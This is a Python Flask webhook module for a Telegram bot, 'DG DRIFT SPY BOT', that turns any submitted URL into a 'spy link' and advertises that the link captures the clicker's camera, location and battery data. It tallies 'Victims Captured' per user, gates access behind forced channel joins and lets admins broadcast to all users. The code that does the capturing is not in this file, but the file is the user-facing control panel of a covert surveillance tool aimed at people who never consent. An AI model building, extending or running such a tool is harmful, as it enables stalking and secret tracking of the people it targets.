import time
import json
import datetime

from flask import Blueprint, request, current_app

from config import config
from core.storage import load_json, save_json
from core.telegram import send_message, answer_callback
from core.users import save_user, bump_links_count, broadcast_all_async
from core.security import is_admin, check_force_join, send_force_join_prompt

# ── Safe optional import for typing indicator ─────────────────
try:
    from core.telegram import send_chat_action
except ImportError:
    def send_chat_action(chat_id, action='typing'):
        pass  # graceful no-op if not implemented in core

bp = Blueprint('webhook', __name__)

_pending = {}   # chat_id -> 'broadcast'


# ──────────────────────────────────────────────────────────────
#  Colour / divider helpers
# ──────────────────────────────────────────────────────────────
DIVIDER = "━━━━━━━━━━━━━━━━━━━━"
THIN     = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"

def _quote(text):
    """Wrap text in a styled blockquote (HTML)."""
    return f"<blockquote>{text}</blockquote>"

def _header(title, emoji="✨"):
    return f"<b>{emoji} <u>{title}</u> {emoji}</b>\n{DIVIDER}"

def _main_keyboard():
    """Persistent bottom reply keyboard."""
    return {
        'keyboard': [
            [{'text': '🔗 Create Link'}, {'text': '📊 My Stats'}],
        ],
        'resize_keyboard': True,
        'is_persistent': True,
        'input_field_placeholder': "Send a URL or use the menu…",
    }


@bp.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(silent=True)
    if not update:
        return 'OK', 200

    try:
        cb = update.get('callback_query')
        if cb:
            return _handle_callback(cb)

        msg = update.get('message')
        if not msg:
            return 'OK', 200

        return _handle_message(msg)
    except Exception:
        current_app.logger.exception("webhook error")
        return 'OK', 200


# ──────────────────────────────────────────────────────────────
#  CALLBACKS
# ──────────────────────────────────────────────────────────────
def _handle_callback(cb):
    data = cb.get('data')
    cb_id = cb.get('id')
    user = cb.get('from', {})
    from_id = user.get('id')
    answer_callback(cb_id)
    save_user(user)

    # ── Force-join recheck ──────────────────────────────────────
    if data == 'check_join':
        ok, missing = check_force_join(from_id)
        if ok:
            send_message(
                from_id,
                "<b>✅ Verification Complete!</b>\n" + DIVIDER + "\n"
                + _quote("🎉 <i>\"Welcome aboard, agent. Your access is now unlocked.\"</i>") + "\n\n"
                + "🔗 Send any URL to create your first spy link.",
                parse_mode='HTML'
            )
        else:
            send_force_join_prompt(from_id, missing)
        return 'OK', 200

    # ── Force-join gate ─────────────────────────────────────────
    ok, missing = check_force_join(from_id)
    if not ok and not is_admin(from_id):
        send_force_join_prompt(from_id, missing)
        return 'OK', 200

    # ── Generate ────────────────────────────────────────────────
    if data == 'generate':
        send_chat_action(from_id, 'typing')
        send_message(
            from_id,
            _header("Generate Spy Link", "🔗") + "\n\n"
            + _quote("📥 <i>\"Every great mission starts with a single link.\"</i>") + "\n\n"
            + "<b>Send target URL</b>\n"
            + "👉 <code>https://youtube.com</code>",
            parse_mode='HTML'
        )

    # ── Stats ───────────────────────────────────────────────────
    elif data == 'stats':
        send_chat_action(from_id, 'typing')
        visitors = load_json('visitors.json')
        links = load_json('links.json')
        mine = [vid for vid, v in visitors.items() if str(v.get('generated_by')) == str(from_id)]
        my_links = [c for c, d in links.items() if str(d.get('created_by')) == str(from_id)]

        send_message(
            from_id,
            _header("Your Statistics", "📊") + "\n\n"
            + "🕵️ <b>Victims Captured:</b> <code>" + str(len(mine)) + "</code>\n"
            + "🔗 <b>Spy Links Created:</b> <code>" + str(len(my_links)) + "</code>\n"
            + DIVIDER + "\n"
            + _quote("💬 <i>\"Know your numbers, master your mission.\"</i>"),
            parse_mode='HTML'
        )

    # ── Users (admin) ───────────────────────────────────────────
    elif data == 'users':
        if not is_admin(from_id):
            send_message(
                from_id,
                "🚫 <b>Access Denied</b>\n" + DIVIDER + "\n"
                + _quote("⛔ <i>\"This gate is locked. Admins only.\"</i>"),
                parse_mode='HTML'
            )
            return 'OK', 200

        send_chat_action(from_id, 'typing')
        users = load_json('users.json')
        lines = [_header("Registered Users", "👥"), ""]
        lines.append(f"👤 <b>Total Users:</b> <code>{len(users)}</code>\n")
        lines.append(DIVIDER)

        for i, (uid, u) in enumerate(list(users.items())[:30], 1):
            name = f"{u.get('first_name','')} {u.get('last_name','')}".strip() or "No name"
            uname = f"@{u['username']}" if u.get('username') else "—"
            lines.append(
                f"\n<b>{i}.</b> {name} ({uname})\n"
                f"   🆔 <code>{uid}</code>\n"
                f"   💬 Msgs: <b>{u.get('messages',0)}</b> │ 🔗 Links: <b>{u.get('links_created',0)}</b>"
            )

        if len(users) > 30:
            lines.append(f"\n{THIN}\n<i>…and <b>{len(users)-30}</b> more. Use /admin.</i>")

        send_message(from_id, "\n".join(lines), parse_mode='HTML')

    return 'OK', 200


# ──────────────────────────────────────────────────────────────
#  MESSAGES
# ──────────────────────────────────────────────────────────────
def _handle_message(msg):
    chat_id = msg.get('chat', {}).get('id')
    user = msg.get('from', {})
    text = (msg.get('text') or '').strip()

    if not chat_id:
        return 'OK', 200
    save_user(user)

    # ── /start ──────────────────────────────────────────────────
    if text == '/start':
        ok, missing = check_force_join(chat_id)
        if not ok and not is_admin(chat_id):
            send_force_join_prompt(chat_id, missing)
            return 'OK', 200

        keyboard = {
            'inline_keyboard': [
                [{'text': '🔗  Generate Spy Link  🔗', 'callback_data': 'generate'}],
                [{'text': '📊  My Statistics  📊',     'callback_data': 'stats'}],
            ]
        }
        if is_admin(chat_id):
            keyboard['inline_keyboard'].append(
                [{'text': '📢  Broadcast  📢', 'callback_data': 'broadcast'}]
            )
            keyboard['inline_keyboard'].append(
                [{'text': '👥  All Users  👥', 'callback_data': 'users'}]
            )

        welcome = (
            "╔══════════════════════════╗\n"
            "   🕵️‍♂️ <b>DG DRIFT SPY BOT</b> 🕵️‍♂️\n"
            "╚══════════════════════════╝\n\n"
            + _quote(
                "✨ <i>\"Every click tells a story.\"</i>\n"
                "🔗 Send any URL to create a spy link."
            ) + "\n\n"
            + DIVIDER + "\n"
            + "🎯 <b>Features:</b>\n"
            + "   📸 Camera Capture\n"
            + "   📍 Location Tracking\n"
            + "   🔋 Battery Info\n"
            + DIVIDER
        )

        # Inline buttons + welcome
        send_message(chat_id, welcome, reply_markup=keyboard, parse_mode='HTML')

        # Persistent bottom reply keyboard (separate message — Telegram allows only 1 reply_markup per message)
        send_message(
            chat_id,
            "👇 <i>Quick menu below for instant access.</i>",
            parse_mode='HTML',
            reply_markup=_main_keyboard()
        )
        return 'OK', 200

    # ── Force-join gate ─────────────────────────────────────────
    ok, missing = check_force_join(chat_id)
    if not ok and not is_admin(chat_id):
        send_force_join_prompt(chat_id, missing)
        return 'OK', 200

    # ── Reply-keyboard button text handlers ─────────────────────
    if text == '🔗 Create Link':
        send_chat_action(chat_id, 'typing')
        send_message(
            chat_id,
            _header("Generate Spy Link", "🔗") + "\n\n"
            + _quote("📥 <i>\"Every great mission starts with a single link.\"</i>") + "\n\n"
            + "<b>Send target URL</b>\n"
            + "👉 <code>https://youtube.com</code>",
            parse_mode='HTML'
        )
        return 'OK', 200

    if text == '📊 My Stats':
        send_chat_action(chat_id, 'typing')
        visitors = load_json('visitors.json')
        links = load_json('links.json')
        mine = [vid for vid, v in visitors.items() if str(v.get('generated_by')) == str(chat_id)]
        my_links = [c for c, d in links.items() if str(d.get('created_by')) == str(chat_id)]

        send_message(
            chat_id,
            _header("Your Statistics", "📊") + "\n\n"
            + "🕵️ <b>Victims Captured:</b> <code>" + str(len(mine)) + "</code>\n"
            + "🔗 <b>Spy Links Created:</b> <code>" + str(len(my_links)) + "</code>\n"
            + DIVIDER + "\n"
            + _quote("💬 <i>\"Know your numbers, master your mission.\"</i>"),
            parse_mode='HTML'
        )
        return 'OK', 200

    # ── /broadcast ──────────────────────────────────────────────
    if text == '/broadcast' and is_admin(chat_id):
        _pending[chat_id] = 'broadcast'
        send_message(
            chat_id,
            _header("Broadcast Mode", "📢") + "\n\n"
            + _quote("📨 <i>\"Send the message you wish to broadcast to all users.\"</i>") + "\n\n"
            + "🛑 Type /cancel to abort.",
            parse_mode='HTML'
        )
        return 'OK', 200

    if text == '/cancel' and chat_id in _pending:
        _pending.pop(chat_id, None)
        send_message(
            chat_id,
            "❌ <b>Broadcast Cancelled</b>\n" + DIVIDER + "\n"
            + _quote("<i>\"No message was sent.\"</i>"),
            parse_mode='HTML'
        )
        return 'OK', 200

    if _pending.get(chat_id) == 'broadcast' and is_admin(chat_id):
        _pending.pop(chat_id, None)
        broadcast_all_async(msg.get('message_id'), chat_id)
        send_message(
            chat_id,
            "🚀 <b>Broadcast Launched!</b>\n" + DIVIDER + "\n"
            + _quote("⚡ <i>\"The message is now flying to all users in the background.\"</i>"),
            parse_mode='HTML'
        )
        return 'OK', 200

    # ── URL → create link ───────────────────────────────────────
    if text.startswith('http'):
        send_chat_action(chat_id, 'typing')

        domain = text.replace('https://', '').replace('http://', '').split('/')[0]
        domain = domain.replace('www.', '').replace('.', '_')
        short_code = f"{domain}_{str(int(time.time()))[-5:]}"

        links = load_json('links.json')
        links[short_code] = {
            'url': text,
            'created_by': str(chat_id),
            'created_at': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }
        save_json('links.json', links)
        bump_links_count(chat_id)

        base = config.get('website', '').rstrip('/')
        if not base:
            send_message(
                chat_id,
                "⚠️ <b>Configuration Error</b>\n" + DIVIDER + "\n"
                + _quote("The server <code>website</code> URL is not configured."),
                parse_mode='HTML'
            )
            return 'OK', 200

        spy_link = f"{base}/s/{short_code}"

        success = (
            _header("Spy Link Created!", "✅") + "\n\n"
            + "🔗 <b>Your Link:</b>\n"
            + f"<code>{spy_link}</code>\n\n"
            + DIVIDER + "\n"
            + "🎯 <b>What it captures:</b>\n"
            + "   📸 Camera\n"
            + "   📍 Location\n"
            + "   🔋 Battery\n\n"
            + _quote("💡 <i>\"Share it wisely — the link is now live.\"</i>")
        )
        send_message(chat_id, success, parse_mode='HTML')
        return 'OK', 200

    # ── Fallback for unknown text ───────────────────────────────
    if text and not text.startswith('/'):
        send_chat_action(chat_id, 'typing')
        send_message(
            chat_id,
            _header("How Can I Help?", "🤖") + "\n\n"
            + _quote("💡 <i>\"Send a URL to create a spy link.\"</i>") + "\n\n"
            + "🔗 <b>Example:</b>\n"
            + "<code>https://youtube.com</code>",
            parse_mode='HTML',
            reply_markup={
                'inline_keyboard': [
                    [{'text': '🔗  Generate Spy Link  🔗', 'callback_data': 'generate'}],
                    [{'text': '📊  My Stats  📊',         'callback_data': 'stats'}],
                ]
            }
        )
        return 'OK', 200

    return 'OK', 200


# ──────────────────────────────────────────────────────────────
#  Webhook management routes
# ──────────────────────────────────────────────────────────────
@bp.route('/set_webhook')
def set_webhook():
    from core.telegram import set_webhook as tg_set_webhook
    base = config.get('website', '').rstrip('/')
    if not base:
        return {'ok': False, 'error': 'config["website"] not set'}, 400
    if not base.startswith('https://'):
        return {'ok': False, 'error': 'Telegram requires HTTPS'}, 400
    return tg_set_webhook(f"{base}/webhook")


@bp.route('/webhook_info')
def webhook_info():
    from core.telegram import get_webhook_info
    return get_webhook_info()
